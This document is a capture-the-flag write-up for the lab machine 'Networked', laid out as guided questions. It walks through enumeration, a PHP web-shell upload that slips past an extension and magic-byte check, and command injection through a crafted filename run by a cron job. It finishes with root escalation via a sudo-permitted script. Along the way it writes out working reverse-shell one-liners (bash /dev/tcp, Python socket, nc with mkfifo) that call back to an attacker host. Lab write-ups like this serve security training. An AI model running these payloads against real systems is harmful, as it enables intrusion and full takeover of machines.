## Networked

### Lab Details 

- Difficulty: Easy
- Type: Web App, Upload, Lateral Movement, Priv Esc, Linux

#### Tasks
Q1: Which version of Apache is running on the target?
- run nmap against the target
```
<snip>
80/tcp  open   http    syn-ack      Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
<snip>
```

Q2: What is the relative path of directory that contains the backup file on the webserver?
- run ffuf against the target 
- /backup on target contains the backup file
```
$ ffuf -u http://10.10.10.146/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.146/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

<snip>
uploads                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 313ms]
backup                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 1491ms]
...
```

Q3: After reading the source code of lib.php we see that JPG, GIF, JPEG, and one other extension can be uploaded via the upload function. What is the other extension? (Enter without the .)
- unarchive the file using `tar`, `tar -xvf backup.tar`
- inspect `upload.php`, on line 23
```
<snip>
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
<snip>
```

Q4: MIME types protect website upload functions from uploading files that are not actually the declared file type. Magic bytes are used to bypass this by appending the bytes to the payload file. What are first eight magic bytes for PNG format? (Give your answer as 16 hex characters)
- we can found the magic byte from here: https://en.wikipedia.org/wiki/List_of_file_signatures
- `89504E470D0A1A0A`

Q5: On Linux operating systems, users have the ability to schedule tasks to run at a desired period of time. What is the default task scheduler in Linux?
- tasks are called cronjobs aka `cron`

## Initial Foothold 
- there is a upload page at `http://10.10.10.146/upload.php`
- we can try to upload a web shell and call a reverse shell 
- I used: https://github.com/artyuum/simple-php-web-shell
- first i uploaded a jpeg file and captured the request using burpsuite
![[captured request.png]]
- after confirming the upload functionality works, i send it to intruder to modify the file content
- keeping the magic byte at the beginning and replace everything afterwards
- changing the MIME type and file extension to reflect jpeg
![[upload webshell.png]]
- we can then access the webshell at /uploads
![[photos.php.png]]

![[webshell.png]]
- run reverse shell in the webshell 

Q6: According to the backup of the crontab file for guly, the check_attack.php script is executed every how many minutes?
 - there is a file called crontab.guly at user guly's home directory and theres a php file thats been run every 3 minutes
```
bash-4.2$ ls -la
ls -la
total 28
drwxr-xr-x. 2 guly guly 4096 Sep  6  2022 .
drwxr-xr-x. 3 root root   18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root    9 Sep  7  2022 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly   33 Jul  8 16:23 user.txt

bash-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```

Q7: In the check_attack.php script, there is one variable that can be controlled by us and is used in the call of a dangerous function. What is that variable name (including the leading $)?
- the script scans for each file in the $path directory, if a malicious file is found then it will log the event and remove the file
- after investigating the php script, the second `exec` is vulnerable due to lack to input sanitation 
```
bash-4.2$ cat check_attack.php
cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>

```

Q8: Submit the flag located in the guly user's home directory.
- since we know that the filename can be used to inject malicious commands, we will need to create a file that allows us to exploit that vulnerability
- tried various methods using `touch`, `printf` command however no luck
- need to hash the malicious command first and wrap it in unhash so the command will be unhashed and executed at run time
```
## on attacker machine
$: echo -n 'bash -c "bash -i >/dev/tcp/10.10.14.20/9005 0>&1"' | base64 
YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMjAvOTAwNSAwPiYxIg==
$: nc -lvnp 9005

## on target, /var/www/html/uploads
bash-4.2$ touch ';echo YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMjAvOTAwNSAwPiYxIg== | base64 -d | bash'

## wait for 3 minutes to receive the shell 
$ nc -lnvp 9005
listening on [any] 9005 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.146] 54492

cat user.txt
063...

## use python to get interactive shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Q9: What is the name of the script that guly can run as root without a password?
- run `sudo -l` to check
```
[guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

Q10: Submit the flag located in root's home directory.
- changename.sh script read user inputs and writes to file called ifcfg-guly
- then executes the config file using `ifup` (last line)
```
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```
- changename.sh script does have regex to filter user input however it still gives room for injection which allows attacker to elevate to root access
- we can try to exploit this with a reverse shell
```
[guly@networked ~]$ echo "#!/bin/bash" > shell
[guly@networked ~]$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.20 9003 >/tmp/f >> shell
[guly@networked ~]$ cat shell
cat shell
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.20 9003 >/tmp/f

[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
eth0 /bin/sh -c /home/guly/shell
eth0 /bin/sh -c /home/guly/shell
interface PROXY_METHOD:


wrong input, try again
interface PROXY_METHOD:
eth0 /bin/sh /home/guly/shell
eth0 /bin/sh /home/guly/shell
<snip>

## on attacker side
$ nc -lvnp 9003
listening on [any] 9003 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.146] 59110
sh-4.2# whoami
whoami
root
sh-4.2# ls /root
ls /root
root.txt
sh-4.2# cat /root/root.txt
cat /root/root.txt
0c8...
```

#### Resources
- magic bytes: https://en.wikipedia.org/wiki/List_of_file_signatures
- web shell used: https://github.com/artyuum/simple-php-web-shell
#### Lesson Learned
